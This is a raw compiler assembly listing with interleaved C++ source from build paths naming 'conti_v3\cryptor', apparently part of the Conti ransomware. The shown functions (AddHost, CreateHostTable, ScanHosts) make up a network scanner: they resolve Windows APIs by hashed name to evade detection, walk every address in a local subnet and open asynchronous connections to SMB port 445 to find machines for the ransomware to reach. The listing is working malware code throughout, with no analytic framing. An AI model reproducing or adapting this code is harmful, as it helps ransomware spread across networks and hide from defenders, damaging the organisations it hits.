; 896  : 	pFunction = (int(WINAPI*)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6ae189ea, 33);//GetProcAddress(hWs2_32, OBFA("WSAAddressToStringW"));

  0009a	8d 57 15	 lea	 edx, QWORD PTR [rdi+21]
  0009d	41 b8 ea 89 e1
	6a		 mov	 r8d, 1793165802		; 6ae189eaH
  000a3	44 8d 4f 21	 lea	 r9d, QWORD PTR [rdi+33]
  000a7	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 897  : 	return pFunction(lpsaAddress, dwAddressLength, lpProtocolInfo, lpszAddressString, lpdwAddressStringLength);

  000ac	48 8d 4c 24 30	 lea	 rcx, QWORD PTR dwAddres$GSCopy$[rsp]
  000b1	45 33 c0	 xor	 r8d, r8d
  000b4	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 357  : 		if (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&temp, sizeof(temp), NULL, HostInfo->wszAddress, &dwAddres)) {

  000b9	4c 8d 4b 04	 lea	 r9, QWORD PTR [rbx+4]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 897  : 	return pFunction(lpsaAddress, dwAddressLength, lpProtocolInfo, lpszAddressString, lpdwAddressStringLength);

  000bd	48 8d 4c 24 38	 lea	 rcx, QWORD PTR temp$[rsp]
  000c2	8d 57 10	 lea	 edx, QWORD PTR [rdi+16]
  000c5	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 357  : 		if (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&temp, sizeof(temp), NULL, HostInfo->wszAddress, &dwAddres)) {

  000c7	83 f8 ff	 cmp	 eax, -1
  000ca	75 0c		 jne	 SHORT $LN11@AddHost

; 358  : 
; 359  : 			free(HostInfo);

  000cc	48 8b cb	 mov	 rcx, rbx
  000cf	e8 00 00 00 00	 call	 free

; 360  : 			return FALSE;

  000d4	33 c0		 xor	 eax, eax
  000d6	eb 63		 jmp	 SHORT $LN31@AddHost
$LN11@AddHost:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  000d8	ba 0f 00 00 00	 mov	 edx, 15
  000dd	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  000e3	44 8d 4a 3d	 lea	 r9d, QWORD PTR [rdx+61]
  000e7	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  000ec	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  000f3	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 368  : 		TAILQ_INSERT_TAIL(&g_HostList, HostInfo, Entries);

  000f5	48 89 7b 30	 mov	 QWORD PTR [rbx+48], rdi
  000f9	4c 8d 43 30	 lea	 r8, QWORD PTR [rbx+48]
  000fd	48 8b 05 08 00
	00 00		 mov	 rax, QWORD PTR ?g_HostList@@3Uhost_list_@@A+8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00104	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 368  : 		TAILQ_INSERT_TAIL(&g_HostList, HostInfo, Entries);

  00109	48 89 43 38	 mov	 QWORD PTR [rbx+56], rax
  0010d	48 8b 05 08 00
	00 00		 mov	 rax, QWORD PTR ?g_HostList@@3Uhost_list_@@A+8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00114	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 368  : 		TAILQ_INSERT_TAIL(&g_HostList, HostInfo, Entries);

  00118	48 89 18	 mov	 QWORD PTR [rax], rbx
  0011b	4c 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_HostList@@3Uhost_list_@@A+8, r8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00122	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  00128	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  0012d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  00134	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 372  : 	return TRUE;

  00136	b8 01 00 00 00	 mov	 eax, 1
$LN31@AddHost:
  0013b	48 8b 7c 24 68	 mov	 rdi, QWORD PTR [rsp+104]

; 373  : }

  00140	48 8b 4c 24 48	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  00145	48 33 cc	 xor	 rcx, rsp
  00148	e8 00 00 00 00	 call	 __security_check_cookie
  0014d	48 83 c4 50	 add	 rsp, 80			; 00000050H
  00151	5b		 pop	 rbx
  00152	c3		 ret	 0
?AddHost@@YAHK@Z ENDP					; AddHost
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?CreateHostTable@@YAHXZ
_TEXT	SEGMENT
bAddres$ = 48
SockAddr$1 = 56
__$ArrayPad$ = 72
?CreateHostTable@@YAHXZ PROC				; CreateHostTable, COMDAT

; 378  : {

$LN53:
  00000	41 56		 push	 r14
  00002	48 83 ec 60	 sub	 rsp, 96			; 00000060H
  00006	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0000d	48 33 c4	 xor	 rax, rsp
  00010	48 89 44 24 48	 mov	 QWORD PTR __$ArrayPad$[rsp], rax

; 379  : 	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&g_SubnetList);

  00015	4c 8b 35 00 00
	00 00		 mov	 r14, QWORD PTR ?g_SubnetList@@3Usubnet_list_@@A

; 380  : 	if (!SubnetInfo) {

  0001c	4d 85 f6	 test	 r14, r14
  0001f	75 16		 jne	 SHORT $LN11@CreateHost

; 381  : 		return FALSE;

  00021	33 c0		 xor	 eax, eax

; 437  : }

  00023	48 8b 4c 24 48	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  00028	48 33 cc	 xor	 rcx, rsp
  0002b	e8 00 00 00 00	 call	 __security_check_cookie
  00030	48 83 c4 60	 add	 rsp, 96			; 00000060H
  00034	41 5e		 pop	 r14
  00036	c3		 ret	 0
$LN11@CreateHost:

; 382  : 	}
; 383  : 
; 384  : 	BYTE bAddres[4];
; 385  : 	DWORD dwAddress;
; 386  : 	RtlCopyMemory(bAddres, &SubnetInfo->dwAddress, 4);

  00037	41 8b 06	 mov	 eax, DWORD PTR [r14]
  0003a	48 89 5c 24 70	 mov	 QWORD PTR [rsp+112], rbx
  0003f	48 89 6c 24 78	 mov	 QWORD PTR [rsp+120], rbp

; 387  : 
; 388  : 	for (BYTE i = 0; i < 255; i++) {

  00044	40 32 ed	 xor	 bpl, bpl
  00047	48 89 bc 24 88
	00 00 00	 mov	 QWORD PTR [rsp+136], rdi
  0004f	4c 89 64 24 58	 mov	 QWORD PTR [rsp+88], r12
  00054	4c 89 7c 24 50	 mov	 QWORD PTR [rsp+80], r15
  00059	45 33 ff	 xor	 r15d, r15d
  0005c	89 44 24 30	 mov	 DWORD PTR bAddres$[rsp], eax
  00060	48 89 b4 24 80
	00 00 00	 mov	 QWORD PTR [rsp+128], rsi
  00068	45 8d 67 02	 lea	 r12d, QWORD PTR [r15+2]
  0006c	0f 1f 40 00	 npad	 4
$LL4@CreateHost:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 477  : 	pFunction = (HGLOBAL(WINAPI*)(UINT, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb2eb0cd3, 68);//GetProcAddress(hKernel32, OBFA("GlobalAlloc"));

  00070	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 390  : 		bAddres[3] = i;

  00075	40 88 6c 24 33	 mov	 BYTE PTR bAddres$[rsp+3], bpl
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 477  : 	pFunction = (HGLOBAL(WINAPI*)(UINT, SIZE_T))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xb2eb0cd3, 68);//GetProcAddress(hKernel32, OBFA("GlobalAlloc"));

  0007a	41 b8 d3 0c eb
	b2		 mov	 r8d, -1293218605	; b2eb0cd3H
  00080	44 8d 4a 35	 lea	 r9d, QWORD PTR [rdx+53]
  00084	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 478  : 	return pFunction(uFlags, dwBytes);

  00089	ba 40 00 00 00	 mov	 edx, 64			; 00000040H
  0008e	8b ca		 mov	 ecx, edx
  00090	ff d0		 call	 rax
  00092	48 8b d8	 mov	 rbx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 394  : 		if (!ConnectCtx) {

  00095	48 85 c0	 test	 rax, rax
  00098	0f 84 23 01 00
	00		 je	 $LN10@CreateHost

; 398  : 		ConnectCtx->dwAddres = dwAddress;

  0009e	8b 44 24 30	 mov	 eax, DWORD PTR bAddres$[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 910  : 	pFunction = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xa7922856, 32);//GetProcAddress(hWs2_32, OBFA("WSASocketW"));

  000a2	ba 15 00 00 00	 mov	 edx, 21
  000a7	41 b8 56 28 92
	a7		 mov	 r8d, -1483593642	; a7922856H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 398  : 		ConnectCtx->dwAddres = dwAddress;

  000ad	89 43 28	 mov	 DWORD PTR [rbx+40], eax

; 399  : 		ConnectCtx->State = NOT_CONNECTED;

  000b0	44 88 63 2c	 mov	 BYTE PTR [rbx+44], r12b
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 910  : 	pFunction = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xa7922856, 32);//GetProcAddress(hWs2_32, OBFA("WSASocketW"));

  000b4	44 8d 4a 0b	 lea	 r9d, QWORD PTR [rdx+11]
  000b8	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 911  : 	return pFunction(af, type, protocol, lpProtocolInfo, g, dwFlags);

  000bd	45 33 c9	 xor	 r9d, r9d
  000c0	c7 44 24 28 01
	00 00 00	 mov	 DWORD PTR [rsp+40], 1
  000c8	41 8b cc	 mov	 ecx, r12d
  000cb	44 89 7c 24 20	 mov	 DWORD PTR [rsp+32], r15d
  000d0	41 8d 51 01	 lea	 edx, QWORD PTR [r9+1]
  000d4	45 8d 41 06	 lea	 r8d, QWORD PTR [r9+6]
  000d8	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 400  : 		ConnectCtx->s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);

  000da	48 89 43 20	 mov	 QWORD PTR [rbx+32], rax

; 401  : 		if (ConnectCtx->s == INVALID_SOCKET) {

  000de	48 83 f8 ff	 cmp	 rax, -1
  000e2	75 1e		 jne	 SHORT $LN13@CreateHost
$LN50@CreateHost:

; 387  : 
; 388  : 	for (BYTE i = 0; i < 255; i++) {

  000e4	ba 0f 00 00 00	 mov	 edx, 15
  000e9	41 b8 2b ce 87
	8d		 mov	 r8d, -1920479701	; 8d87ce2bH
  000ef	44 8d 4a 34	 lea	 r9d, QWORD PTR [rdx+52]
  000f3	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  000f8	48 8b cb	 mov	 rcx, rbx
  000fb	ff d0		 call	 rax
  000fd	e9 b2 00 00 00	 jmp	 $LN2@CreateHost
$LN13@CreateHost:
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00102	33 c0		 xor	 eax, eax
  00104	48 8d 7c 24 38	 lea	 rdi, QWORD PTR SockAddr$1[rsp]
  00109	b9 10 00 00 00	 mov	 ecx, 16
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 921  : 	pFunction = (int(WINAPI*)(SOCKET, const sockaddr*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6291cb76, 31);//GetProcAddress(hWs2_32, OBFA("bind"));

  0010e	41 b8 76 cb 91
	62		 mov	 r8d, 1653721974		; 6291cb76H
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00114	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 410  : 		SockAddr.sin_family = AF_INET;

  00116	4c 89 64 24 38	 mov	 QWORD PTR SockAddr$1[rsp], r12
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 921  : 	pFunction = (int(WINAPI*)(SOCKET, const sockaddr*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6291cb76, 31);//GetProcAddress(hWs2_32, OBFA("bind"));

  0011b	8d 50 15	 lea	 edx, QWORD PTR [rax+21]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 414  : 		if (pbind(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) {

  0011e	48 8b 7b 20	 mov	 rdi, QWORD PTR [rbx+32]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 921  : 	pFunction = (int(WINAPI*)(SOCKET, const sockaddr*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6291cb76, 31);//GetProcAddress(hWs2_32, OBFA("bind"));

  00122	44 8d 48 1f	 lea	 r9d, QWORD PTR [rax+31]
  00126	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 922  : 	return pFunction(s, addr, namelen);

  0012b	41 b8 10 00 00
	00		 mov	 r8d, 16
  00131	48 8d 54 24 38	 lea	 rdx, QWORD PTR SockAddr$1[rsp]
  00136	48 8b cf	 mov	 rcx, rdi
  00139	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 414  : 		if (pbind(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) {

  0013b	85 c0		 test	 eax, eax
  0013d	74 1f		 je	 SHORT $LN14@CreateHost
$LN51@CreateHost:

; 387  : 
; 388  : 	for (BYTE i = 0; i < 255; i++) {

  0013f	48 8b 7b 20	 mov	 rdi, QWORD PTR [rbx+32]
  00143	ba 15 00 00 00	 mov	 edx, 21
  00148	41 b8 ba 66 3c
	3e		 mov	 r8d, 1044145850		; 3e3c66baH
  0014e	44 8d 4a 0d	 lea	 r9d, QWORD PTR [rdx+13]
  00152	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00157	48 8b cf	 mov	 rcx, rdi
  0015a	ff d0		 call	 rax
  0015c	eb 86		 jmp	 SHORT $LN50@CreateHost
$LN14@CreateHost:

; 422  : 		if (!pCreateIoCompletionPort((HANDLE)ConnectCtx->s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) {

  0015e	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 507  : 	pFunction = (HANDLE(WINAPI*)(HANDLE, HANDLE, ULONG_PTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xac9084f4, 65);//GetProcAddress(hKernel32, OBFA("CreateIoCompletionPort"));

  00165	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 422  : 		if (!pCreateIoCompletionPort((HANDLE)ConnectCtx->s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) {

  0016a	48 8b 73 20	 mov	 rsi, QWORD PTR [rbx+32]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 507  : 	pFunction = (HANDLE(WINAPI*)(HANDLE, HANDLE, ULONG_PTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xac9084f4, 65);//GetProcAddress(hKernel32, OBFA("CreateIoCompletionPort"));

  0016e	41 b8 f4 84 90
	ac		 mov	 r8d, -1399814924	; ac9084f4H
  00174	44 8d 4a 32	 lea	 r9d, QWORD PTR [rdx+50]
  00178	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 508  : 	return pFunction(FileHandle, ExistingCompletionPort, CompletionKey, NumberOfConcurrentThreads);

  0017d	45 33 c9	 xor	 r9d, r9d
  00180	4d 8b c4	 mov	 r8, r12
  00183	48 8b d7	 mov	 rdx, rdi
  00186	48 8b ce	 mov	 rcx, rsi
  00189	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 422  : 		if (!pCreateIoCompletionPort((HANDLE)ConnectCtx->s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) {

  0018b	48 85 c0	 test	 rax, rax
  0018e	74 af		 je	 SHORT $LN51@CreateHost

; 423  : 
; 424  : 			pclosesocket(ConnectCtx->s);
; 425  : 			pGlobalFree(ConnectCtx);
; 426  : 			continue;
; 427  : 
; 428  : 		}
; 429  : 
; 430  : 		TAILQ_INSERT_TAIL(&g_ConnectionList, ConnectCtx, Entries);

  00190	4c 89 7b 30	 mov	 QWORD PTR [rbx+48], r15
  00194	48 8d 4b 30	 lea	 rcx, QWORD PTR [rbx+48]
  00198	48 8b 05 08 00
	00 00		 mov	 rax, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8
  0019f	48 89 43 38	 mov	 QWORD PTR [rbx+56], rax
  001a3	48 8b 05 08 00
	00 00		 mov	 rax, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8
  001aa	48 89 18	 mov	 QWORD PTR [rax], rbx
  001ad	48 89 0d 08 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8, rcx
$LN2@CreateHost:

; 387  : 
; 388  : 	for (BYTE i = 0; i < 255; i++) {

  001b4	40 fe c5	 inc	 bpl
  001b7	40 80 fd ff	 cmp	 bpl, 255		; 000000ffH
  001bb	0f 82 af fe ff
	ff		 jb	 $LL4@CreateHost
$LN10@CreateHost:

; 431  : 
; 432  : 	}
; 433  : 
; 434  : 	TAILQ_REMOVE(&g_SubnetList, SubnetInfo, Entries);

  001c1	49 8b 4e 08	 mov	 rcx, QWORD PTR [r14+8]
  001c5	49 8b 46 10	 mov	 rax, QWORD PTR [r14+16]
  001c9	4c 8b 7c 24 50	 mov	 r15, QWORD PTR [rsp+80]
  001ce	4c 8b 64 24 58	 mov	 r12, QWORD PTR [rsp+88]
  001d3	48 8b b4 24 80
	00 00 00	 mov	 rsi, QWORD PTR [rsp+128]
  001db	48 8b 6c 24 78	 mov	 rbp, QWORD PTR [rsp+120]
  001e0	48 8b 5c 24 70	 mov	 rbx, QWORD PTR [rsp+112]
  001e5	48 85 c9	 test	 rcx, rcx
  001e8	74 06		 je	 SHORT $LN16@CreateHost
  001ea	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax
  001ee	eb 07		 jmp	 SHORT $LN17@CreateHost
$LN16@CreateHost:
  001f0	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_SubnetList@@3Usubnet_list_@@A+8, rax
$LN17@CreateHost:
  001f7	49 8b 7e 10	 mov	 rdi, QWORD PTR [r14+16]

; 435  : 	free(SubnetInfo);

  001fb	49 8b ce	 mov	 rcx, r14
  001fe	49 8b 56 08	 mov	 rdx, QWORD PTR [r14+8]
  00202	48 89 17	 mov	 QWORD PTR [rdi], rdx
  00205	e8 00 00 00 00	 call	 free

; 436  : 	return TRUE;

  0020a	48 8b bc 24 88
	00 00 00	 mov	 rdi, QWORD PTR [rsp+136]
  00212	b8 01 00 00 00	 mov	 eax, 1

; 437  : }

  00217	48 8b 4c 24 48	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  0021c	48 33 cc	 xor	 rcx, rsp
  0021f	e8 00 00 00 00	 call	 __security_check_cookie
  00224	48 83 c4 60	 add	 rsp, 96			; 00000060H
  00228	41 5e		 pop	 r14
  0022a	c3		 ret	 0
?CreateHostTable@@YAHXZ ENDP				; CreateHostTable
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?ScanHosts@@YAXXZ
_TEXT	SEGMENT
SockAddr$1 = 64
dwBytesSent$2 = 80
__$ArrayPad$ = 88
?ScanHosts@@YAXXZ PROC					; ScanHosts, COMDAT

; 442  : {

$LN19:
  00000	40 53		 push	 rbx
  00002	48 83 ec 60	 sub	 rsp, 96			; 00000060H
  00006	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0000d	48 33 c4	 xor	 rax, rsp
  00010	48 89 44 24 58	 mov	 QWORD PTR __$ArrayPad$[rsp], rax

; 443  : 	PCONNECT_CONTEXT ConnectCtx = NULL;
; 444  : 	TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

  00015	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  0001c	48 85 db	 test	 rbx, rbx
  0001f	0f 84 b6 00 00
	00		 je	 $LN3@ScanHosts
  00025	48 89 6c 24 70	 mov	 QWORD PTR [rsp+112], rbp
  0002a	bd 02 00 00 00	 mov	 ebp, 2
  0002f	48 89 74 24 78	 mov	 QWORD PTR [rsp+120], rsi
  00034	33 f6		 xor	 esi, esi
  00036	48 89 bc 24 80
	00 00 00	 mov	 QWORD PTR [rsp+128], rdi
  0003e	66 90		 npad	 2
$LL4@ScanHosts:
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00040	33 c0		 xor	 eax, eax
  00042	48 8d 7c 24 40	 lea	 rdi, QWORD PTR SockAddr$1[rsp]
  00047	b9 10 00 00 00	 mov	 ecx, 16
  0004c	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 450  : 		SockAddr.sin_port = htons(SMB_PORT);

  0004e	b9 bd 01 00 00	 mov	 ecx, 445		; 000001bdH
  00053	66 89 6c 24 40	 mov	 WORD PTR SockAddr$1[rsp], bp
  00058	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_htons

; 451  : 		SockAddr.sin_addr.s_addr = ConnectCtx->dwAddres;
; 452  : 
; 453  : 		if (g_ConnectEx(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr), NULL, 0, &dwBytesSent, (LPOVERLAPPED)ConnectCtx)) {

  0005e	48 8b 4b 20	 mov	 rcx, QWORD PTR [rbx+32]
  00062	48 8d 54 24 40	 lea	 rdx, QWORD PTR SockAddr$1[rsp]
  00067	66 89 44 24 42	 mov	 WORD PTR SockAddr$1[rsp+2], ax
  0006c	45 33 c9	 xor	 r9d, r9d
  0006f	8b 43 28	 mov	 eax, DWORD PTR [rbx+40]
  00072	89 44 24 44	 mov	 DWORD PTR SockAddr$1[rsp+4], eax
  00076	48 8d 44 24 50	 lea	 rax, QWORD PTR dwBytesSent$2[rsp]
  0007b	48 89 5c 24 30	 mov	 QWORD PTR [rsp+48], rbx
  00080	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  00085	45 8d 41 10	 lea	 r8d, QWORD PTR [r9+16]
  00089	89 74 24 20	 mov	 DWORD PTR [rsp+32], esi
  0008d	ff 15 00 00 00
	00		 call	 QWORD PTR ?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA ; g_ConnectEx
  00093	85 c0		 test	 eax, eax
  00095	74 0e		 je	 SHORT $LN5@ScanHosts

; 454  : 
; 455  : 			ConnectCtx->State = CONNECTED;
; 456  : 			AddHost(ConnectCtx->dwAddres);

  00097	8b 4b 28	 mov	 ecx, DWORD PTR [rbx+40]
  0009a	40 88 73 2c	 mov	 BYTE PTR [rbx+44], sil
  0009e	e8 00 00 00 00	 call	 ?AddHost@@YAHK@Z	; AddHost

; 457  : 
; 458  : 		}

  000a3	eb 17		 jmp	 SHORT $LN2@ScanHosts
$LN5@ScanHosts:

; 459  : 		else if (WSA_IO_PENDING == WSAGetLastError()) {

  000a5	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_WSAGetLastError
  000ab	3d e5 03 00 00	 cmp	 eax, 997		; 000003e5H
  000b0	75 0a		 jne	 SHORT $LN2@ScanHosts

; 460  : 
; 461  : 			g_ActiveOperations++;

  000b2	ff 05 00 00 00
	00		 inc	 DWORD PTR ?g_ActiveOperations@@3JA ; g_ActiveOperations

; 462  : 			ConnectCtx->State = CONNECTING;

  000b8	c6 43 2c 01	 mov	 BYTE PTR [rbx+44], 1
$LN2@ScanHosts:

